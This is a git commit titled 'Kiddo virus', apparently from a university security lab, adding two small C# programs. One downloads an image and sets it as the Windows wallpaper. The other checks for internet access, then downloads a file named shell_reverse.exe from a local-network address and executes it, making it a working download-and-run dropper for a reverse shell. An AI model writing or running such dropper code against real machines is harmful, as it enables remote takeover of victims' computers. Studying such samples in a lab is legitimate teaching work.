2c2ecc99df504b3dc7ed0281c7f51c6c0fe8841d
CeiYsBennova <20520691@gm.uit.edu.vn>
2023-04-07 00:44:31 +0700

    Kiddo virus

---
+++ Lab2_1113a/Lab2_1113a/Program.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Net;
+using System.Runtime.InteropServices;
+
+var filename ="image.jpg";
+
+new WebClient().DownloadFile("http://www.google.com/images/srpr/logo3w.png", filename);
+
+string path = AppDomain.CurrentDomain.BaseDirectory;
+ChangeWallpaper(path + filename);
+
+[DllImport("user32.dll", CharSet = CharSet.Auto)]
+static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+const int SPI_SETDESKWALLPAPER = 20;
+const int SPIF_UPDATEINIFILE = 0x01;
+const int SPIF_SENDWININICHANGE = 0x02;
+
+void ChangeWallpaper(string path)
+{
+    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
+}
---
+++ Lab2_1113b/Lab2_1113b/Program.cs
@@ -0,0 +1,33 @@
+﻿using System.Net;
+using System.Diagnostics;
+
+bool CheckInternet()
+{
+    try
+    {
+        using (var client = new WebClient())
+        using (client.OpenRead("http://www.google.com"))
+            return true;
+    }
+    catch
+    {
+        return false;
+    }
+}
+
+if (CheckInternet() == true)
+{
+    var webClient = new WebClient();
+    string path = Directory.GetCurrentDirectory() + "\\shell_reverse.exe";
+    webClient.DownloadFile(new Uri("http://192.168.19.128/shell_reverse.exe"),path);
+    Process.Start(path);
+}
+
+else
+{
+    string filename = @"C:\Users\Public\Desktop\hello.txt";
+    using (StreamWriter sw = File.CreateText(filename))
+    {
+        sw.WriteLine("Hello World!");
+    }
+}
